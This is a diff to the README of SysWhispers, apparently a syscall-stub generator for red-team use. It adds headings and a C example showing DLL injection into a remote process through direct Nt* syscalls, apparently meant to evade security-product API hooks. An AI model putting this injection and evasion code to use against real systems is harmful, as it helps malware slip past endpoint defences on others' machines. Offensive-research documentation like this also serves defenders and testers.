@@ -14,7 +14,7 @@ The main implementation difference between this and the [Dumpert](https://github
 
 ## Usage and Examples
 
-Example command lines to generate output:
+### Command Lines
 
 ```powershell
 # Export all functions with compatibility for all supported Windows versions (see output dir).
@@ -30,7 +30,7 @@ py .\syswhispers.py --functions NtProtectVirtualMemory,NtWriteVirtualMemory -o s
 py .\syswhispers.py --versions 7,8,10 -o syscalls_78X
 ```
 
-Example output of the script:
+### Script Output
 
 ```
 PS C:\Projects\SysWhispers> py .\syswhispers.py --preset common --out-file syscom
@@ -49,7 +49,7 @@ Complete! Files written to:
         syscom.h
 ```
 
-Before-and-after example of classic `CreateRemoteThread` injection:
+### Before-and-After Example of Classic `CreateRemoteThread` Injection
 
 ```c
 #include <Windows.h>
@@ -61,6 +61,24 @@ void InjectDll(const HANDLE hProcess, const char* dllPath)
 	
 	::WriteProcessMemory(hProcess, lpBaseAddress, dllPath, strlen(dllPath), nullptr);
 	::CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpBaseAddress, 0, nullptr);
+}
+```
+
+```c
+#include <Windows.h>
+#include "syscalls.h" // Import the generated header.
+
+void InjectDll(const HANDLE hProcess, const char* dllPath)
+{
+
+	HANDLE hThread = NULL;
+	LPVOID lpAllocationStart = nullptr;
+	SIZE_T szAllocationSize = strlen(dllPath);
+	LPVOID lpStartAddress = ::GetProcAddress(::GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
+	
+	::NtAllocateVirtualMemory(hProcess, &lpAllocationStart, 0, (PULONG)&szAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	::NtWriteVirtualMemory(hProcess, lpAllocationStart, (PVOID)dllPath, strlen(dllPath), nullptr);
+	::NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, lpStartAddress, lpAllocationStart, FALSE, 0, 0, 0, nullptr);
 }
 ```
 
